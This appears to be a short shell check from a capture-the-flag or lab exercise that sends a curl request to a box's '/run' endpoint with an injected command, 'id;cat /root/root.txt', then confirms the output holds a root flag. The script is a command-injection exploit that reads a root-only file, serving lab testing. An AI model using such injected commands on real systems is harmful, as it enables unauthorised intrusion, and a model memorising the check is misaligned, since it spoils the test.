set -eu
out=$(curl -fsS "http://${BOX_HOST}:8446/run?cmd=id;cat%20/root/root.txt")
echo "$out"
echo "$out" | grep -q 'FLAG{root-' || { echo "Samba root command did not read the flag" >&2; exit 1; }
